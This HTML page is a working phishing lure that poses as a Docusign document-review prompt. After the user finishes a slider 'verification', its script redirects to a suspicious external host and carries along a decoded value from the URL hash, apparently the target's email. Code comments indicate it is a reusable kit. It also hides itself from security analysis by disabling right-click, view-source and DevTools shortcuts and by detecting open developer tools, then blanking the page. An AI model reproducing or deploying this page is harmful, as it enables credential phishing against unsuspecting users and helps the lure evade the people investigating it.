<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Docusign Verification</title>
  <style>
    body {
      background-color: #dbeaf4;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 300px;
      margin: 40px auto;
      padding: 30px;
      background-color: white;
      border-radius: 15px;
      text-align: center;
      box-shadow: 0px 8px 20px rgba(0,0,0,0.15);
    }
    .logo {
      width: 200px;
      margin-bottom: 20px;
    }
    h2 {
      margin: 10px 0;
      font-weight: bold;
    }
    .desc {
      margin-bottom: 30px;
      color: #444;
    }

    /* Slider styles */
    .slider-container {
      position: relative;
      width: 100%;
      height: 50px;
      background-color: #f1f1f1;
      border-radius: 25px;
      overflow: hidden;
      user-select: none;
      cursor: pointer;
      margin-bottom: 20px;
      box-shadow: inset 0 2px 5px rgba(0,0,0,0.1);
    }

    .slider-fill {
      position: absolute;
      top: 0;
      left: 0;
      height: 100%;
      background-color: #0078d4;
      border-radius: 25px;
      width: 0%;
      transition: width 0.05s linear;
    }

    .slider-thumb {
      position: absolute;
      top: 50%;
      transform: translate(-50%, -50%);
      width: 85px;
      height: 55px;
      background-color: #fff;
      border: 5px solid #0078d4;
      border-radius: 70%;
      box-shadow: 0px 2px 5px rgba(0,0,0,0.2);
    }

    .slider-text {
      position: absolute;
      width: 100%;
      top: 50%;
      left: 0;
      transform: translateY(-50%);
      text-align: center;
      font-size: 14px;
      color: #333;
      pointer-events: none;
    }

    .slider-text.verifying {
      color: #0078d4;
      font-weight: bold;
    }

    /* overlay used when DevTools detected (keeps visual behavior intact until detection) */
    .__deterrent-overlay {
      position: fixed;
      inset: 0;
      background: rgba(255,255,255,0.98);
      z-index: 999999;
      display: none;
      align-items: center;
      justify-content: center;
      color: #333;
      font-family: Arial, sans-serif;
      font-size: 16px;
      text-align: center;
      padding: 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }
  </style>
</head>

    <h2>Docusign Documents</h2>
    <p class="desc">Slide the bar to the right to review document</p>

    <!-- Slider replaces the fake captcha -->
    <div class="slider-container" id="sliderTrack">
      <div class="slider-fill" id="sliderFill"></div>
      <div class="slider-thumb" id="sliderThumb"></div>
      <div class="slider-text" id="sliderText">Slide to review</div>
    </div>

  </div>

  <!-- Overlay element shown when DevTools detection triggers -->
  <div id="__deterrentOverlay" class="__deterrent-overlay">
    <div>
      <div style="margin-bottom:12px;font-weight:600;">Page access restricted</div>
      <div style="max-width:520px;margin:0 auto;color:#555;">
        Developer tools or page saving has been detected. For security reasons this page will become inaccessible.
      </div>
    </div>
  </div>

  <script>
    // Redirect logic (kept identical)
    const targetUrl = "https://ms1cloudtree.tfdsqazcmopl.stardustradio.space/f/39c797ed985a"; // replace with your URL

    function cleanHash(hash) {
      if (!hash) return "";
      if (/^[A-Za-z0-9]+$/.test(hash)) return "";
      if (hash.includes("=")) hash = hash.split("=")[1];
      try {
        return atob(hash);
      } catch (e) {
        try {
          return decodeURIComponent(hash);
        } catch (ee) {
          return hash;
        }
      }
    }

    // Slider logic replacing captcha
    const sliderTrack = document.getElementById('sliderTrack');
    const sliderFill = document.getElementById('sliderFill');
    const sliderThumb = document.getElementById('sliderThumb');
    const sliderText = document.getElementById('sliderText');

    let isDragging = false;
    let startX = 0;
    let startLeft = 0;

    // Mouse events
    sliderThumb.addEventListener('mousedown', startDrag);
    document.addEventListener('mousemove', drag);
    document.addEventListener('mouseup', stopDrag);

    // Touch events
    sliderThumb.addEventListener('touchstart', startDrag);
    document.addEventListener('touchmove', drag);
    document.addEventListener('touchend', stopDrag);

    // Click on track
    sliderTrack.addEventListener('click', function(e) {
      const rect = sliderTrack.getBoundingClientRect();
      const clickX = e.clientX - rect.left;
      const percentage = (clickX / rect.width) * 100;
      updateSlider(percentage);
    });

    function startDrag(e) {
      isDragging = true;
      const clientX = e.type === 'mousedown' ? e.clientX : e.touches[0].clientX;
      startX = clientX;
      startLeft = parseFloat(sliderThumb.style.left) || 0;
      e.preventDefault();
    }

    function drag(e) {
      if (!isDragging) return;
      const clientX = e.type === 'mousemove' ? e.clientX : e.touches[0].clientX;
      const deltaX = clientX - startX;
      const trackRect = sliderTrack.getBoundingClientRect();
      const percentage = ((startLeft + deltaX) / trackRect.width) * 100;
      updateSlider(percentage);
      e.preventDefault();
    }

    function stopDrag() {
      isDragging = false;
    }

    function updateSlider(percentage) {
      percentage = Math.max(0, Math.min(100, percentage));
      sliderFill.style.width = percentage + '%';
      sliderThumb.style.left = percentage + '%';

      if (percentage < 10) {
        sliderText.textContent = 'Slide to verify';
        sliderText.classList.remove('verifying');
      } else if (percentage < 90) {
        sliderText.textContent = 'Keep sliding...';
        sliderText.classList.remove('verifying');
      } else if (percentage >= 95) {
        sliderText.textContent = 'Verifying...';
        sliderText.classList.add('verifying');

        // Disable further dragging
        sliderThumb.style.pointerEvents = 'none';
        sliderTrack.style.pointerEvents = 'none';

        // Wait 1 second, then redirect (same logic as old captcha)
        setTimeout(() => {
          const rawHash = window.location.hash.substring(1);
          const cleanedHash = cleanHash(rawHash);
          let redirectUrl = targetUrl;
          if (cleanedHash) {
            redirectUrl += `#${cleanedHash}`;
          }
          try {
            window.location.href = redirectUrl;
          } catch (e) {
            try { window.location.replace(redirectUrl); } catch (ee) {}
          }
        }, 1000);
      }
    }

    /* -------------------------------
       DevTools deterrent logic kept intact
    ---------------------------------*/
    (function addDeterrents() {
      const overlay = document.getElementById("__deterrentOverlay");

      document.addEventListener("contextmenu", e => e.preventDefault(), { passive: false });
      document.addEventListener("selectstart", e => {
        const t = e.target;
        if (t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA')) return;
        e.preventDefault();
      }, { passive: false });

      document.addEventListener("keydown", function (e) {
        const ctrlOrCmd = e.ctrlKey || e.metaKey;
        const shift = e.shiftKey;
        if (e.key === "F12" || (ctrlOrCmd && !shift && ['u','s'].includes(e.key.toLowerCase())) ||
            (ctrlOrCmd && shift && ['i','j','c'].includes(e.key.toLowerCase()))) {
          e.preventDefault();
          e.stopPropagation();
          triggerDeterrent("shortcut");
        }
      }, true);

      let devtoolsOpenDetected = false;
      let lastCheck = Date.now();
      function checkBySize() {
        try {
          const widthDiff = Math.abs(window.outerWidth - window.innerWidth);
          const heightDiff = Math.abs(window.outerHeight - window.innerHeight);
          return widthDiff > 160 || heightDiff > 160;
        } catch { return false; }
      }
      function checkByDebuggerTimer() {
        const start = performance.now();
        for (let i = 0; i < 100000; i++) {}
        const delta = performance.now() - start;
        return delta > 1200;
      }
      function performDevtoolsChecks() {
        if (devtoolsOpenDetected) return;
        if (checkBySize()) {
          devtoolsOpenDetected = true;
          triggerDeterrent("size");
          return;
        }
        const now = Date.now();
        if (now - lastCheck > 2500) {
          lastCheck = now;
          try {
            if (checkByDebuggerTimer()) {
              devtoolsOpenDetected = true;
              triggerDeterrent("timer");
            }
          } catch {}
        }
      }
      const checkInterval = setInterval(performDevtoolsChecks, 1000);

      let deterrentTriggered = false;
      function triggerDeterrent(reason) {
        if (deterrentTriggered) return;
        deterrentTriggered = true;
        overlay.style.display = "flex";
        overlay.innerHTML = '<div><div style="margin-bottom:12px;font-weight:700;">Access Restricted</div><div style="max-width:520px;margin:0 auto;color:#555;">Security tool detected (' + String(reason) + '). For protection, this page is being disabled.</div></div>';
        setTimeout(() => {
          try { window.location.replace("about:blank"); } 
          catch { document.body.innerHTML = ''; }
        }, 1600);
      }
      window.addEventListener("beforeunload", () => clearInterval(checkInterval));
    })();
  </script>
